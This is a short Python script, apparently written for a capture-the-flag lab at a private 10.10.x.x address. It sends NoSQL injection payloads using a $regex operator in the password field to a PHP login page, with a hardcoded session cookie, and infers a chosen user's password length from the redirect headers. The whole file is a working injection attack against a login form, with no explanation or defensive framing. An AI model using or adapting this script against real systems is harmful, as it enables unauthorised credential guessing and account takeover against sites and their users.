import requests

url = "http://10.10.66.192/login.php"

headers = {
    'Host': '10.10.66.192',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.10.66.192',
    'Connection': 'keep-alive',
    'Referer': 'http://10.10.66.192/',
    'Cookie': 'PHPSESSID=n2d9k055vjnrfcq260nta0mnq2',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i'
}

def len_of_pass():

   user = input("Enter name of user: ")

   for i in range(100):
       value = i

       payload = f"user={user}&pass[$regex]=^.{{{value}}}$&remember=on"
       response = requests.post(url, headers=headers, data=payload, allow_redirects=False)

       if 'Location' in response.headers and response.headers['Location'] != "/?err=1":
           print(f"Password length is {value}!")
           break
       else:
           pass


print("*** NoSQL Brute *** " + "\n")
len_of_pass()


